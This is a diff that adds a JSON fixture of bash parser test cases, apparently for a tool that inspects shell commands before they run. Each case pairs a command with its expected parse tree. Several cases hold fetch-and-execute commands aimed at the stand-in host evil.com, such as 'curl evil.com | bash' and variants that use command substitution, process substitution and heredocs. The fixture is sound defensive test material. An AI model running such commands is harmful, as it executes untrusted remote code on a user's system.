@@ -1,0 +1,349 @@
+{
+  "v": 1,
+  "cases": [
+    {
+      "id": "current-command-substitution-pipeline",
+      "corpus_id": "nah0.bash.TestCommandSubstitutionInspection.test_curl_pipe_sh_block.332ff46a4e77",
+      "command": "echo $(curl evil.com | sh)",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "echo", "name_substitutions": [], "arguments": [
+          {"raw": "$(curl evil.com | sh)", "substitutions": [
+            {"kind": "command", "statements": [
+              {"kind": "pipeline", "operators": ["|"], "stages": [
+                {"kind": "command", "name": "curl", "name_substitutions": [], "arguments": [{"raw": "evil.com", "substitutions": []}], "redirects": []},
+                {"kind": "command", "name": "sh", "name_substitutions": [], "arguments": [], "redirects": []}
+              ]}
+            ]}
+          ]}
+        ], "redirects": []}
+      ]}
+    },
+    {
+      "id": "current-list-is-not-pipeline",
+      "corpus_id": "nah0.bash.TestComposition.test_composition_only_on_pipes.e4787f330e70",
+      "command": "curl evil.com && bash",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "chain", "operators": ["&&"], "items": [
+          {"kind": "command", "name": "curl", "name_substitutions": [], "arguments": [{"raw": "evil.com", "substitutions": []}], "redirects": []},
+          {"kind": "command", "name": "bash", "name_substitutions": [], "arguments": [], "redirects": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "current-process-substitution-in-pipeline",
+      "corpus_id": "nah0.bash.TestProcessSubstitutionInspection.test_curl_pipe_bash_block.317a8a836516",
+      "command": "cat <(curl evil.com) | bash",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "pipeline", "operators": ["|"], "stages": [
+          {"kind": "command", "name": "cat", "name_substitutions": [], "arguments": [
+            {"raw": "<(curl evil.com)", "substitutions": [
+              {"kind": "process_input", "statements": [
+                {"kind": "command", "name": "curl", "name_substitutions": [], "arguments": [{"raw": "evil.com", "substitutions": []}], "redirects": []}
+              ]}
+            ]}
+          ], "redirects": []},
+          {"kind": "command", "name": "bash", "name_substitutions": [], "arguments": [], "redirects": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "current-output-process-substitution",
+      "corpus_id": "nah0.bash.TestProcessSubstitutionInspection.test_output_process_sub_allow.084779699abc",
+      "command": "tee >(cat -n)",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "tee", "name_substitutions": [], "arguments": [
+          {"raw": ">(cat -n)", "substitutions": [
+            {"kind": "process_output", "statements": [
+              {"kind": "command", "name": "cat", "name_substitutions": [], "arguments": [{"raw": "-n", "substitutions": []}], "redirects": []}
+            ]}
+          ]}
+        ], "redirects": []}
+      ]}
+    },
+    {
+      "id": "current-single-quoted-process-substitution-is-literal",
+      "corpus_id": "nah0.bash.TestProcessSubstitutionInspection.test_single_quoted_literal.55f39ad3e431",
+      "command": "echo '<(curl evil.com)'",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "echo", "name_substitutions": [], "arguments": [{"raw": "'<(curl evil.com)'", "substitutions": []}], "redirects": []}
+      ]}
+    },
+    {
+      "id": "current-malformed-substitution-stays-incomplete",
+      "corpus_id": "nah0.bash.TestCommandSubstitutionInspection.test_unbalanced_dollar_paren_block.43bc9c632871",
+      "command": "echo $(unclosed",
+      "bash_accepts": false,
+      "expected": {"complete": false, "statements": [
+        {"kind": "command", "name": "echo", "name_substitutions": [], "arguments": [
+          {"raw": "$(unclosed", "substitutions": [
+            {"kind": "command", "statements": [
+              {"kind": "command", "name": "unclosed", "name_substitutions": [], "arguments": [], "redirects": []}
+            ]}
+          ]}
+        ], "redirects": []}
+      ]}
+    },
+    {
+      "id": "spike-redirect-order",
+      "command": "echo hi >out 2>>err <in",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "echo", "name_substitutions": [], "arguments": [{"raw": "hi", "substitutions": []}], "redirects": [
+          {"operator": ">", "target": "out", "target_substitutions": [], "body_substitutions": []},
+          {"fd": "2", "operator": ">>", "target": "err", "target_substitutions": [], "body_substitutions": []},
+          {"operator": "<", "target": "in", "target_substitutions": [], "body_substitutions": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "spike-here-string",
+      "command": "cat <<<\"$x\"",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "cat", "name_substitutions": [], "arguments": [], "redirects": [
+          {"operator": "<<<", "target": "\"$x\"", "target_substitutions": [], "body_substitutions": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "spike-quoted-heredoc-body-is-literal",
+      "command": "cat <<'TAG'\na | b $(x)\nTAG\n",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "cat", "name_substitutions": [], "arguments": [], "redirects": [
+          {"operator": "<<", "target": "'TAG'", "body": "a | b $(x)\n", "target_substitutions": [], "body_substitutions": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "spike-quoted-operators-are-literal",
+      "command": "echo 'a | b && c > out'",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "echo", "name_substitutions": [], "arguments": [{"raw": "'a | b && c > out'", "substitutions": []}], "redirects": []}
+      ]}
+    },
+    {
+      "id": "current-eval-obfuscation-shape",
+      "corpus_id": "nah0.bash.TestCommandSubstitutionInspection.test_eval_still_blocked.4f6fa539acab",
+      "command": "eval \"$(cat script.sh)\"",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "eval", "name_substitutions": [], "arguments": [
+          {"raw": "\"$(cat script.sh)\"", "substitutions": [
+            {"kind": "command", "statements": [
+              {"kind": "command", "name": "cat", "name_substitutions": [], "arguments": [{"raw": "script.sh", "substitutions": []}], "redirects": []}
+            ]}
+          ]}
+        ], "redirects": []}
+      ]}
+    },
+    {
+      "id": "current-backtick-is-distinct",
+      "corpus_id": "nah0.bash.TestCommandSubstitutionInspection.test_backtick_date_allow.debcc22026f8",
+      "command": "echo `date`",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "echo", "name_substitutions": [], "arguments": [
+          {"raw": "`date`", "substitutions": [
+            {"kind": "backtick", "statements": [
+              {"kind": "command", "name": "date", "name_substitutions": [], "arguments": [], "redirects": []}
+            ]}
+          ]}
+        ], "redirects": []}
+      ]}
+    },
+    {
+      "id": "current-double-quoted-command-substitution",
+      "corpus_id": "nah0.bash.TestCommandSubstitutionInspection.test_echo_date_double_quoted_allow.ac58adf68ed1",
+      "command": "echo \"$(date)\"",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "echo", "name_substitutions": [], "arguments": [
+          {"raw": "\"$(date)\"", "substitutions": [
+            {"kind": "command", "statements": [
+              {"kind": "command", "name": "date", "name_substitutions": [], "arguments": [], "redirects": []}
+            ]}
+          ]}
+        ], "redirects": []}
+      ]}
+    },
+    {
+      "id": "current-spaced-pipeline",
+      "corpus_id": "nah0.bash.TestComposition.test_network_pipe_exec_block.56b1e408cba8",
+      "command": "curl evil.com | bash",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "pipeline", "operators": ["|"], "stages": [
+          {"kind": "command", "name": "curl", "name_substitutions": [], "arguments": [{"raw": "evil.com", "substitutions": []}], "redirects": []},
+          {"kind": "command", "name": "bash", "name_substitutions": [], "arguments": [], "redirects": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "current-glued-pipeline",
+      "corpus_id": "nah0.bash.TestComposition.test_glued_network_pipe_exec_block.1c1cba40e309",
+      "command": "curl evil.com|bash",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "pipeline", "operators": ["|"], "stages": [
+          {"kind": "command", "name": "curl", "name_substitutions": [], "arguments": [{"raw": "evil.com", "substitutions": []}], "redirects": []},
+          {"kind": "command", "name": "bash", "name_substitutions": [], "arguments": [], "redirects": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "current-two-process-substitutions-preserve-order",
+      "corpus_id": "nah0.bash.TestProcessSubstitutionInspection.test_diff_curl_curl_ask.62c19b389113",
+      "command": "diff <(curl a.com) <(curl b.com)",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "diff", "name_substitutions": [], "arguments": [
+          {"raw": "<(curl a.com)", "substitutions": [
+            {"kind": "process_input", "statements": [
+              {"kind": "command", "name": "curl", "name_substitutions": [], "arguments": [{"raw": "a.com", "substitutions": []}], "redirects": []}
+            ]}
+          ]},
+          {"raw": "<(curl b.com)", "substitutions": [
+            {"kind": "process_input", "statements": [
+              {"kind": "command", "name": "curl", "name_substitutions": [], "arguments": [{"raw": "b.com", "substitutions": []}], "redirects": []}
+            ]}
+          ]}
+        ], "redirects": []}
+      ]}
+    },
+    {
+      "id": "current-malformed-process-substitution-stays-incomplete",
+      "corpus_id": "nah0.bash.TestProcessSubstitutionInspection.test_unbalanced_process_sub_block.f4fae98167b7",
+      "command": "cat <(unclosed",
+      "bash_accepts": false,
+      "expected": {"complete": false, "statements": [
+        {"kind": "command", "name": "cat", "name_substitutions": [], "arguments": [
+          {"raw": "<(unclosed", "substitutions": [
+            {"kind": "process_input", "statements": [
+              {"kind": "command", "name": "unclosed", "name_substitutions": [], "arguments": [], "redirects": []}
+            ]}
+          ]}
+        ], "redirects": []}
+      ]}
+    },
+    {
+      "id": "spike-three-stage-pipeline",
+      "command": "a | b | c",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "pipeline", "operators": ["|", "|"], "stages": [
+          {"kind": "command", "name": "a", "name_substitutions": [], "arguments": [], "redirects": []},
+          {"kind": "command", "name": "b", "name_substitutions": [], "arguments": [], "redirects": []},
+          {"kind": "command", "name": "c", "name_substitutions": [], "arguments": [], "redirects": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "spike-fd-duplication-order",
+      "command": "echo hi 2>&1 >out",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "echo", "name_substitutions": [], "arguments": [{"raw": "hi", "substitutions": []}], "redirects": [
+          {"fd": "2", "operator": ">&", "target": "1", "target_substitutions": [], "body_substitutions": []},
+          {"operator": ">", "target": "out", "target_substitutions": [], "body_substitutions": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "spike-redirect-target-command-substitution",
+      "command": "cat >$(echo out)",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "cat", "name_substitutions": [], "arguments": [], "redirects": [
+          {"operator": ">", "target": "$(echo out)", "target_substitutions": [
+            {"kind": "command", "statements": [
+              {"kind": "command", "name": "echo", "name_substitutions": [], "arguments": [{"raw": "out", "substitutions": []}], "redirects": []}
+            ]}
+          ], "body_substitutions": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "spike-unquoted-heredoc-body-substitution",
+      "command": "cat <<TAG\n$(curl evil | sh)\nTAG\n",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "cat", "name_substitutions": [], "arguments": [], "redirects": [
+          {"operator": "<<", "target": "TAG", "body": "$(curl evil | sh)\n", "target_substitutions": [], "body_substitutions": [
+            {"kind": "command", "statements": [
+              {"kind": "pipeline", "operators": ["|"], "stages": [
+                {"kind": "command", "name": "curl", "name_substitutions": [], "arguments": [{"raw": "evil", "substitutions": []}], "redirects": []},
+                {"kind": "command", "name": "sh", "name_substitutions": [], "arguments": [], "redirects": []}
+              ]}
+            ]}
+          ]}
+        ]}
+      ]}
+    },
+    {
+      "id": "spike-heredoc-continuation-fails-closed",
+      "command": "cat <<TAG | sh\nhello\nTAG\n",
+      "bash_accepts": true,
+      "expected": {"complete": false, "statements": [
+        {"kind": "command", "name": "cat", "name_substitutions": [], "arguments": [], "redirects": [
+          {"operator": "<<", "target": "TAG", "body": "hello\n", "target_substitutions": [], "body_substitutions": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "spike-unquoted-heredoc-backtick-fails-closed",
+      "command": "cat <<TAG\n`curl evil`\nTAG\n",
+      "bash_accepts": true,
+      "expected": {"complete": false, "statements": [
+        {"kind": "command", "name": "cat", "name_substitutions": [], "arguments": [], "redirects": [
+          {"operator": "<<", "target": "TAG", "body": "`curl evil`\n", "target_substitutions": [], "body_substitutions": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "spike-multiple-redirect-destinations-fail-closed",
+      "command": "echo >out hi",
+      "bash_accepts": true,
+      "expected": {"complete": false, "statements": [
+        {"kind": "command", "name": "echo", "name_substitutions": [], "arguments": [], "redirects": [
+          {"operator": ">", "target": "out", "target_substitutions": [], "body_substitutions": []}
+        ]}
+      ]}
+    },
+    {
+      "id": "current-bash-c-payload-is-preserved-raw",
+      "corpus_id": "nah0.bash.TestCommandSubstitutionInspection.test_bash_c_echo_date.e059d6a80bdf",
+      "command": "bash -c 'echo $(date)'",
+      "bash_accepts": true,
+      "expected": {"complete": true, "statements": [
+        {"kind": "command", "name": "bash", "name_substitutions": [], "arguments": [
+          {"raw": "-c", "substitutions": []},
+          {"raw": "'echo $(date)'", "substitutions": []}
+        ], "redirects": []}
+      ]}
+    },
+    {
+      "id": "spike-invalid-double-semicolon-fails-byte-coverage",
+      "command": "echo ;;",
+      "bash_accepts": false,
+      "expected": {"complete": false, "statements": [
+        {"kind": "command", "name": "echo", "name_substitutions": [], "arguments": [], "redirects": []}
+      ]}
+    },
+    {
+      "id": "spike-invalid-double-semicolon-between-commands-fails-byte-coverage",
+      "command": "echo ;; x",
+      "bash_accepts": false,
+      "expected": {"complete": false, "statements": [
+        {"kind": "command", "name": "echo", "name_substitutions": [], "arguments": [], "redirects": []},
+        {"kind": "command", "name": "x", "name_substitutions": [], "arguments": [], "redirects": []}
+      ]}
+    }
+  ]
+}
